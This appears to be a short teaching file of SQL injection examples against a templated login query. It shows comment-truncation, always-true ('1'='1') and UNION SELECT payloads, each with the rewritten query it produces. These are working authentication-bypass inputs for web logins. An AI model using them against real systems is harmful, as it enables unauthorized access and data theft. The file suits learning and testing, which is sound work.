
------------------------------SQL INJECTIONS EXAMPLES ---------------------------------
---------------------------------------------------------------------------------------

-- Basic request
SELECT * FROM users WHERE username = '{username}' and password = '{password}';


-- Inserting    JaaOuT' --    username instead of {username}
--      JaaOuT' --      in SQL
--      JaaOuT' #       in Python 
SELECT * FROM users WHERE username = '{username}' and password = '{password}';
SELECT * FROM users WHERE username = 'JaaOuT' --' and password = '{password}';


-- Inserting    ' or '' = '    instead of {username} and {password}
--      ' or '' = '     in SQL
--      ' or '' = '     in Python
SELECT * FROM users WHERE username = '{username}' and password = '{password}';
SELECT * FROM users WHERE username = '' or '' = '' and password = '' or '' = '';


-- Inserting    ' or '1' = '1    instead of {username} and {password}
--      ' or '1' = '1   in SQL
--      ' or '1' = '1   in Python
SELECT * FROM users WHERE username = '{username}' and password = '{password}';
SELECT * FROM users WHERE username = '' or '1' = '1' and password = '' or '1' = '1';


-- Inserting    ' UNION SELECT * FROM users --     instead of {username}
--      ' UNION SELECT * FROM users --      in SQL
--      ' UNION SELECT * FROM users #       in Python 
SELECT * FROM users WHERE username = '{username}' and password = '{password}';
SELECT * FROM users WHERE username = '' UNION SELECT * FROM users -- and password = '{password}';


-- Inserting    ' or '' = '    instead of {username} and    ' or '1' = '1      instead of {password}
--      ' or '' = '     
--      ' or '1' = '1    
SELECT * FROM users WHERE username = '{username}' and password = '{password}';
SELECT * FROM users WHERE username = '' or '' = '' and password = '' or '1' = '1';
      
